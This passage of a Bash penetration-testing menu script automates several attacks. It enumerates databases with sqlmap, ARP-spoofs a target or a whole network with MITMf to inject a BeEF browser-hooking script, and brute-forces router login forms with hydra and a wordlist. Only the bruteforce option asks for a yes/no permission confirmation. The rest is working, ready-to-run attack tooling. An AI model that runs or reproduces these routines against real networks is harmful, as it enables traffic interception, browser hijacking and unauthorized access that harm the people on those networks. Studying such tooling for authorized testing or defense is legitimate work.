			read DCH
			clear
			if [[ "$DCH" = "b" || "$DCH" = "back" ]]
			then
				break
			fi
			if [[ "$DCH" -le 0 || "$DCH" -gt "$NDB" ]]
			then
				echo -e """$RS""Wrong choice""$CE"""
				sleep 2
			else
				SD="${db[$DCH]}"
				sds=1
					##Clearing nexts
					TB=""
					tbs=0
					ST=""
					sts=0
					cls=0
					CL=""
					scs=0
					SC=""
				break
			fi	
		done
	elif [[ "$SQ" = 2 ]]
	then
		if [[ "$urls" != 1 ]]
		then
			echo -e """$RS""URL not selected""$CE"""
			sleep 2
			continue
		fi
		file="/root/lscript/sqltemp"
		sqlmap -u "$URL" --dbs <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file"
		##Find the line
		CHECK=$(cat "$file" | grep "available databases ")
		if [[ "$CHECK" = "" ]]
		then
			fdbss=0
			echo -e """$RS""No databases found or not vulnerable website""$CE"""
			fdbss=0
			echo -e "$PAKTGB"
			$READAK
			continue
		fi
		LINED=$(cat "$file" | awk '{if(/available databases /)print NR}')
		LINED=$((LINED+1))
		##list databases
		n=0
		echo -e "${BS}Calculating...${CE}"
		while true
		do
			CH=$(cat "$file" | awk -v n7="$LINED" '{if(NR==n7)print}')
			if [[ "$CH" = "" ]]
			then
				break
			else
				##how many dbs found
				n=$((n+1))
				##next line
				LINED=$((LINED+1))
			fi
			CHH=$(echo "$CH" | awk -F "] " '{print $2}')
			if [[ "$CHH" = "" ]]
			then
				echo -e """$RS""Error 21""$CE"""
				CHH="${RS}Error${CE}"
				sleep 3
			fi
			db[$n]="$CHH"
		done
		sleep 1
		if [[ "$n" = 0 ]]
		then
			echo -e """$RS""Error 22 No databases found automatically""$CE"""
			echo -e "$PAKTGB"
			$READAK
			continue
		elif [[ "$n" = 1 ]]
		then
			echo -e """$YS""1 database found!""$CE"""
			sleep 1
		else
			echo -e """$YS""$n databases found!""$CE"""
			sleep 1
		fi
		echo -e ""
		FDBS="${YS}Done${CE}"
		fdbss=1
		NDB="$n"
				##Clearing nexts
				SD=""
				sds=0
				TB=""
				tbs=0
				ST=""
				sts=0
				cls=0
				CL=""
				scs=0
				SC=""
	fi	
done
}

function mitmf_hook
{
	TERMINALTITLE="MITMF + BEEF"
	dash_calc
	printf '\033]2;MITMF + BEEF\a'
	if [[ -d /root/MITMf ]]
	then
		TEST=$(ip addr | grep "$ETH")
		n=1
		echo -e """$BS""Available interfaces""$CE"": "
		if [[ "$TEST" != "" ]]
		then
			echo -e """$YS""$n""$CE"") ""$ETH"""
			in[$n]="$ETH"
			n=$((n+1))
		fi
		TEST=$(ip addr | grep "$WLANN")
		if [[ "$TEST" != "" ]]
		then
			echo -e """$YS""$n""$CE"") $WLANN"
			in[$n]="$WLANN"
			n=$((n+1))
		fi
		TEST=$(ip addr | grep "$WLANNM")
		if [[ "$TEST" != "" ]]
		then
			echo -e """$YS""$n""$CE"") $WLANNM"
			in[$n]="$WLANNM"
			n=$((n+1))
		fi
		echo -e "Choose: "
		read ints
		if [[ "$ints" -le "$n" && "$ints" -ge 1 ]]
		then
			#~ echo -e "You selected "$YS"${in[$ints]}"$CE"" #debugging
			mitmfint="${in[$ints]}"
			export mitmfint
			clear
			mitmfgate=$(route -n | grep "$mitmfint" | awk '{if($2!="0.0.0.0"){print $2}}')
			export mitmfgate
			clear
			echo -e "Target's IP: "
			read mitmftar
			TEST=$(ip addr | grep "$mitmfint")
			if [[ $TEST != "" ]]
			then
				iffile="${LPATH}/iftemp.txt"
				ip addr show "$mitmfint" > $iffile
				mitmflocalip=$(cat $iffile | awk '/inet /{print $2}' | cut -d '/' -f1)
			fi
			clear
			echo -e "hook.js URL path(""$YS""Enter""$CE""=http://""$mitmflocalip"":3000/hook.js): "
			read hookch
			if [[ "$hookch" = "" ]]
			then
				mitmfhook="http://${mitmflocalip}:3000/hook.js"
			else
				mitmfhook="$hookch"
			fi
			export mitmfhook
			cd /root/MITMf || exit
			clear
			python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$mitmftar" --hsts --inject --js-url "$mitmfhook"
			cd || exit
		fi
	else
		echo -e """$RS""Mitmf is not installed.type '""$CE""""$YS""install""$CE""""$RS""' to install it."
		read INSTALL
		if [[ "$INSTALL" = "install" ]]
		then
			echo -e """$RS""No installation added yet""$CE"""
			sleep 2
		fi
	fi
	cd || exit
}

function bruteforce_router
{
while true
do
	clear
	TERMINALTITLE="BRUTEFORCE LOGIN"
	dash_calc
	TERMINALTITLE="ONLY FOR LEGAL PURPOSES"
	dash_calc
	printf '\033]2;BRUTEFORCE LOGIN\a'
	if [[ "$BI" = "" ]]
	then
		TT=$(ip addr | grep "$WLANN")
		if [[ "$TT" = "" ]]
		then
			bin=0
			BI="${RS}None${CE}"
		else
			bin=1
			BI="$WLANN"
		fi
	fi
	if [[ "$US" = "" ]]
	then
		US="admin"
	fi
	if [[ "$WL" = "" ]]
	then
		wls=0
		WL="${RS}None${CE}"
	fi
	if [[ "$RQ" = "" ]]
	then
		rqq=0
		RQ="${RS}None${CE}"
	fi
	if [[ "$UP" = "" ]]
	then
		upp=0
		UP="${RS}None${CE}"
	fi
	if [[ "$IS" = "" ]]
	then
		iss=0
		IS="${RS}None${CE}"
	fi
	if [[ "$FM" = "" ]]
	then
		FM="http-post-form"
	fi
	#~ echo -e ""$RS"ONLY FOR LEGAL PURPOSES"$CE""
	echo -e """$YS"" 1""$CE"") Select interface           Current:""$YS""""$BI""""$CE"""
	echo -e """$YS"" 2""$CE"") Set username               Current:""$YS""""$US""""$CE"""
	echo -e """$YS"" 3""$CE"") Select wordlist            Current:""$YS""""$WL""""$CE"""
	echo -e """$YS"" 4""$CE"") Request URI:               Current:""$YS""""$RQ""""$CE"""
	echo -e """$YS"" 5""$CE"") ^USER^ & ^PASS^ field      Current:""$YS""""$UP""""$CE"""
	echo -e """$YS"" 6""$CE"") Invalid pass string        Current:""$YS""""$IS""""$CE"""
	echo -e """$YS"" 7""$CE"") Form                       Current:""$YS""""$FM""""$CE"""
	echo -e """$YS"" 8""$CE"") Open router's login page in browser"
	echo -e """$YS"" w""$CE"") Open Wireshark"
	echo -e """$YS"" s""$CE"") Start bruteforcing"
	echo -e """$YS""bu""$CE"") Burpsuite automated tool"
	echo -e """$YS"" i""$CE"") Info"
	echo -e """$YS"" b""$CE"") Go back"
	echo -n "Choose: "
	read BR
	clear
	if [[ "$BR" = "b" || "$BR" = 00 || "$BR" = "back" ]]
	then
		BACKL=1
		break
	elif [[ "$BR" = "bu" ]]
	then
		burpsuite
	elif [[ "$BR" = "w" ]]
	then
		wireshark & disown
	elif [[ "$BR" = 0 ]]
	then
		exit
	elif [[ "$BR" = "i" ]]
	then
		echo -e """$LGYS""With hydra you can bruteforce your router's login screen."
		echo -e "Select interface"
		echo -e "	You need to select an interface so the script can get the gateway."
		echo -e "Set username"
		echo -e "	Set the username for the login screen.(e.g. admin)"
		echo -e "Select wordlist"
		echo -e "	Select a text file with a password on every line."
		echo -e "Request URI"
		echo -e "	You will find this on Wireshark. Follow the video below for instructions."
		echo -e "	(e.g. /login.php) or (e.g. /cgi-bin/login.exe) etc etc..."
		echo -e "^USER^ & ^PASS^ field"
		echo -e "	You will find this on Wireshark. Follow the video below for instructions."
		echo -e "	(e.g. username=^USER^&password=^PASS^)"
		echo -e "Invalid pass string"
		echo -e "	You will find this when you try to login with the wrong pass on the login page."
		echo -e "	You need to set a word that is being printed on the screen when login fails."
		echo -e "	(e.g. Invalid) or (e.g. Wrong) or (e.g. Please) etc etc..."
		echo -e "	Follow the video below for instructions."
		echo -e "Form"
		echo -e "	(e.g. http-get-form) or (e.g. http-post-form) etc etc..."
		echo -e ""
		echo -e "Video-demonstration: https://www.youtube.com/watch?v=vgbP0AQ5bt4"
		echo -e ""
		echo -e """$CE"""
		echo -e "$PAKTGB"
		$READAK
	elif [[ "$BR" = 1 ]]
	then
		select_interface
		if [[ "$OUTPUT" != "" && "$OUTPUT" != 0 ]]
		then
			bin=1
			BI="$OUTPUT"
		else
			bin=0
		fi
	elif [[ "$BR" = 2 ]]
	then
		echo -n "Username: "
		read US
	elif [[ "$BR" = 3 ]]
	then
		echo -n "Wordlist: "
		read WL
		if [[ ! -f "$WL" ]]
		then
			WL=""
			echo -e """$RS""Couldn't find the wordlist""$CE"""
			wls=0
			sleep 2
		else
			wls=1
		fi
	elif [[ "$BR" = 4 ]]
	then
		echo -n "Request URI: "
		read RQ
		rqq=1
	elif [[ "$BR" = 5 ]]
	then
		echo -n "^USER^ & ^PASS^ field: "
		read UP
		upp=1
	elif [[ "$BR" = 6 ]]
	then
		echo -n "Invalid pass string: "
		read IS
		iss=1
	elif [[ "$BR" = 7 ]]
	then
		echo -n "Form: "
		read FM
	elif [[ "$BR" = 8 ]]
	then
		if [[ "$bin" != 1 ]]
		then
			echo -e """$RS""Please select an interface first""$CE"""
			sleep 3
			continue
		fi
		TT=$(ip addr | grep "$BI")
		if [[ "$TT" = "" ]]
		then
			echo -e """$RS""""$BI"" is not available""$CE"""
			sleep 2
			BI=""
			continue
		fi
		echo -e """$BS""Searching gateway on ""$BI""""$CE""..."
		sleep 0.5
		GATE=$(find_gateways "$BI" interface)
		TTT=$(is_it_an_ip "$GATE")
		if [[ "$TTT" != 1 ]]
		then
			echo -e """$RS""Couldn't find your gateway.""$CE"""
			sleep 2
			echo -e """$RS""Make sure you are connected to a network""$CE"""
			sleep 3
			continue
		else
			echo -e """$YS""Gateway found: ""$GATE""""$CE"""
			sleep 1
		fi
		clear
		gio open "http://""$GATE"""
		echo -e "Your browser is going to open"
		sleep 2
	elif [[ "$BR" = "s" ]]
	then
		if [[ "$bin" != 1 ]]
		then
			echo -e """$RS""Please select an interface first""$CE"""
			sleep 3
			continue
		fi
		if [[ "$wls" != 1 ]] 
		then
			echo -e """$RS""Set a wordlist first""$CE"""
			sleep 2
			continue
		fi
		TT=$(ip addr | grep "$BI")
		if [[ "$TT" = "" ]]
		then
			echo -e """$RS""""$BI"" is not available""$CE"""
			sleep 2
			BI=""
			continue
		fi
		if [[ "$rqq" != 1 ]]
		then
			echo -e """$RS""Please set the Request URI""$CE"""
			sleep 2
			continue
		fi
		if [[ "$iss" != 1 ]]
		then
			echo -e """$RS""Please set the invalid pass string""$CE"""
			sleep 2
			continue
		fi
		if [[ "$upp" != 1 ]]
		then
			echo -e """$RS""Please set the ^USER^ & ^PASS^ field""$CE"""
			sleep 2
			continue
		fi
		if [[ "$FM" = "" ]]
		then
			echo -e """$RS""Set the Form first""$CE"""
			sleep 2
			continue
		fi
		echo -e """$BS""Searching gateway on ""$BI""""$CE""..."
		sleep 1
		GATE=$(find_gateways "$BI" interface)
		TTT=$(is_it_an_ip "$GATE")
		if [[ "$TTT" != 1 ]]
		then
			echo -e """$RS""Couldn't find your gateway.""$CE"""
			sleep 2
			echo -e """$RS""Make sure you are connected to a network""$CE"""
			sleep 3
			continue
		else
			echo -e """$YS""Gateway found: ""$GATE""""$CE"""
			sleep 2
		fi
		clear
		echo -e """$RS""Do you have permission to bruteforce this network?""$CE""""$YNONLY"""
		read PERM
		if [[ "$PERM" != "y" && "$PERM" != "Y" ]]
		then
			echo -e """$RS""You cannot proceed then""$CE"""
			sleep 3
			continue
		fi
		hydra -l "$US" -P "$WL" -e nsr -f -V "$GATE" "$FM" """$RQ"":""$UP"":""$IS"""
		echo -e "$PAKTGB"
		$READAK
	fi
done
}

function browser_exploiting
{
	if [[ ! -f /usr/bin/arp-scan && ! -f /usr/sbin/arp-scan ]]
	then
		echo -e """$BS""Installing arp-scan""$CE"""
		install_arp_scan
		clear
	fi
	TAR=""
	SINT=""
	beefrunning=0
	clear
	while true
	do
		clear
		TERMINALTITLE="Auto-exploit browser"
		dash_calc
		printf '\033]2;AUTO-EXPLOIT BROWSER\a'
		if [[ "$SINT" = "" ]]
		then
			WL=$(ip addr | grep "$WLANN:")
			if [[ "$WL" != "" ]]
			then
				SINT="$WLANN"
				inter=0
			else
				EL=$(ip addr | grep "$ETH:")
				if [[ "$EL" != "" ]]
				then
					SINT="$ETH"
					inter=0
				else
					SINT="${RS}Not found${CE}"
					inter=1
				fi
			fi
			
		fi
		if [[ "$TAR" = "" ]]
		then
			TAR="${RS}Not set${CE}"
			tarer=1
		fi
		echo -e """$YS"" 1""$CE"") Select interface                CURRENT:""$YS""""$SINT""""$CE"""
		echo -e """$YS"" 2""$CE"") Select target                   CURRENT:""$YS""""$TAR""""$CE"""
		echo -e """$YS"" 3""$CE"") Start BeEF"
		echo -e """$YS"" 4""$CE"") Open BeEF's ui panel in browser"
		echo -e """$YS"" 5""$CE"") Start MITMf"
		echo -e """$YS"" 6""$CE"") Fix errors"
		#~ echo -e ""$YS" 4"$CE") Close all windows"
		echo -e """$YS"" i""$CE"") Info"
		echo -e """$YS"" b""$CE"") Go back"
		echo -e "Choose: "
		read AEB
		clear
		if [[ "$AEB" = "b" || "$AEB" = 00 ]]
		then
			clear
			BACKL=1
			break
		elif [[ "$AEB" = "i" ]]
		then
			clear
			echo -e """$LGYS""On this menu you can exploit and control browsers on your network."
			echo -e "Instructions: "
			echo -e "BeEF:"
			echo -e "	First you need to specify an interface. Then start BeEF."
			echo -e "	Then open the UI panel and log in with beef:beef ."
			echo -e "	There you will see if any online browsers."
			echo -e "MITMf:"
			echo -e "	First you need to specify an interface and a target. Then start MITMf."
			echo -e "	MITMf tries to inject the hook.js javascript to the target's website.""$CE"""
			echo -e "$PAKTGB"
			$READAK
		elif [[ "$AEB" = 6 ]]
		then
			while true
			do
			clear
			TERMINALTITLE="Fix errors"
			dash_calc
			printf '\033]2;FIX ERRORS\a'
			echo -e """$YS"" 1""$CE"") MITMf error: Another process running on port 53"
			echo -e """$YS"" 2""$CE"") BeEF  error: Another process listening on port 3000"
			echo -e """$YS"" 3""$CE"") MITMf error: Could not resolve Gateway's MAC"
			echo -e """$YS"" 4""$CE"") MITMf error: [Errno 98] Address already in use"
			echo -e """$YS"" b""$CE"") Go back"
			echo -e "Choose: "
			read AE
			clear
			if [[ "$AE" = 1 ]]
			then
				#~ echo -e "For this error, you need to type "$YS"netstat -lnpu | grep :53"$CE" to find the process that runs
				#~ on port 53 and kill it by "$YS"kill <PID>"$CE""
				PID1=$(lsof -t -i:53)
				if [[ "$PID1" = "" ]]
				then
					echo -e """$RS""Could not find the process running on port 53""$CE"""
				else
					kill "$PID1" && echo -e """$YS""Fixed.""$CE"""
				fi
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = 2 ]]
			then
				echo -e "You are facing this error because you did not press ""$YS""ctrl c""$CE"" on BeEF's window
				to close it."
				echo -e ""
				PID1=$(lsof -t -i:3000)
				if [[ "$PID1" = "" ]]
				then
					echo -e """$RS""Could not find the process running on port 3000""$CE"""
				else
					kill "$PID1" && echo -e """$YS""Fixed.""$CE"""
				fi
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = 3 ]]
			then
				echo -e "The only fix on this is to retry mitmf option until it starts correctly."
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = 4 ]]
			then
				HT=$(lsof -t -i:80)
				if [[ "$HT" = "" ]]
				then
					echo -e """$RS""Could not find the issue""$CE"""
				else
					kill "$HT" && echo -e """$YS""Fixed""$CE"""
				fi
				echo -e ""
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$AE" = "b" ]]
			then
				clear
				break
			fi
			done
		elif [[ "$AEB" = 4 ]]
		then
			#make sure BeEF is running.
			if [[ "$beefrunning" = 0 ]]
			then
				echo -e """$RS""BeEF is not running""$CE"""
				sleep 3
			else
				clear
				export SINT
				LOC=$(local_ips "$SINT")
				export LOC
				CONF=$(is_it_an_ip "$LOC")
				if [[ "$CONF" = 1 ]]
				then
					gio open http://"$LOC":3000/ui/panel
				else
					echo -e """$RS""Could not find your local IP""$CE"""
					sleep 3
				fi
			fi
		elif [[ "$AEB" = 2 ]]
		then
			if [[ "$inter" != 1 ]]
			then
				clear
				while true
				do
					clear
					TERMINALTITLE="Select target"
					dash_calc
					printf '\033]2;SELECT TARGET\a'
					echo -e """$YS"" 1""$CE"") Scan and choose"
					echo -e """$YS"" 2""$CE"") Type target's IP"
						echo -e """$YS"" 3""$CE"") Target the whole network"
					echo -e """$YS"" b""$CE"") Go back"
					echo -e "Choose: "
					read TARR
					clear
					if [[ "$TARR" = "b" ]]
					then
						break
					elif [[ "$TARR" = 1 ]]
					then
						ip_scan "$SINT" 1
						TARGETI="$OUTPUT"
						size=${#TARGETI}
						if [[ "$size" -le 16 && "$size" -ge 7 ]]
						then
							TAR="$TARGETI"
							tarer=0
						else
							tarer=1
						fi
						wholenetwork=0
						break
					elif [[ "$TARR" = 2 ]]
					then
						echo -e "Target: "
						read TARGETI
						size=${#TARGETI}
						if [[ "$size" -le 16 && "$size" -ge 7 ]]
						then
							TAR="$TARGETI"
							tarer=0
						else
							echo -e """$RS""Invalid IP""$CE"""
							tarer=1
							sleep 2
						fi
						wholenetwork=0
						break
					elif [[ "$TARR" = 3 ]]
					then	
						TAR="EVERYONE"
						tarer=0
						wholenetwork=1
						break
					fi
				done
			else
				echo -e """$RS""Select interface first""$CE"""
				sleep 2
			fi
		elif [[ "$AEB" = 5 ]]
		then
			if [[ "$inter" = 0 && "$tarer" = 0 ]]
			then
				if [[ -d /root/MITMf ]]
				then
						mitmfint="$SINT"
						export mitmfint
						clear
						mitmfgate=$(route -n | grep "$mitmfint" | awk '{if($2!="0.0.0.0"){print $2}}')
						isit=$(is_it_an_ip "$mitmfgate")
						if [[ "$mitmfgate" != "" && "$isit" = 1 ]]
						then
							export mitmfgate
							clear
							TEST=$(ip addr | grep "$mitmfint")
							if [[ $TEST != "" ]]
							then
								iffile="${LPATH}/iftemp.txt"
								ip addr show "$mitmfint" > $iffile
								mitmflocalip=$(cat $iffile | awk '/inet /{print $2}' | cut -d '/' -f1)
							else
								echo -e """$RS""ERROR 5. Could not find your local IP. Make sure you are connected to a network on interface ""$SINT""""$CE"""
								echo -e "$PAKTGB"
								$READAK
								continue
							fi
							clear
							echo -e "hook.js URL path(""$YS""Enter""$CE""=http://""$mitmflocalip"":3000/hook.js): "
							read hookch
							if [[ "$hookch" = "" ]]
							then
								mitmfhook="http://${mitmflocalip}:3000/hook.js"
							else
								mitmfhook="$hookch"
							fi
							export mitmfhook
							cd /root/MITMf || exit
							clear
							if [[ "$wholenetwork" == 0 ]]
							then
								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e bash -c "python mitmf.py -i ""$mitmfint"" --spoof --arp --gateway ""$mitmfgate"" --target ""$TAR"" --hsts --inject --js-url ""$mitmfhook"" && echo -e '' && echo -e 'Close this window manually'"  & disown
							else
								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e bash -c "python mitmf.py -i ""$mitmfint"" --spoof --arp --gateway ""$mitmfgate"" --hsts --inject --js-url ""$mitmfhook"" && echo -e '' && echo -e 'Close this window manually'"  & disown
							fi
							cd || exit
						else
							echo -e """$RS""ERROR 4. Could not find gateway. Make sure you are connected to a network on interface ""$SINT""""$CE"""
							echo -e "$PAKTGB"
							$READAK
						fi
				else
					echo -e """$RS""Mitmf is not installed.Type '""$CE""""$YS""install""$CE""""$RS""' to install it."
					read INSTALL
					if [[ "$INSTALL" = "install" ]]
					then
						install_mitmf
					fi
				fi
				cd || exit
			else
				if [[ "$inter" = 1 ]]
				then
					echo -e """$RS""No interface selected""$CE"""
				fi
				if [[ "$tarer" = 1 ]]
				then
					echo -e """$RS""No target selected""$CE"""
					sleep 1
				fi
				sleep 2
			fi
		elif [[ "$AEB" = 3 ]]
		then
			if [[ "$inter" = 1 ]]
			then
				echo -e """$RS""No interface selected""$CE"""
				sleep 2
				continue
			fi
			cd /usr/share/beef-xss || exit 
			beefrunning=1
			xterm -T "BEEF" -hold -geometry 80x15+9999+0 -e bash -c "./beef && echo -e '' && beefrunning=0 && export beefrunning && echo -e 'Close this window manually'" & disown
			cd || exit
		elif [[ "$AEB" = 0 ]]
		then
			clear
			exit
		elif [[ "$AEB" = 1 ]]
		then
			select_interface
			
		#if inter=1 then error
		fi
	done
}
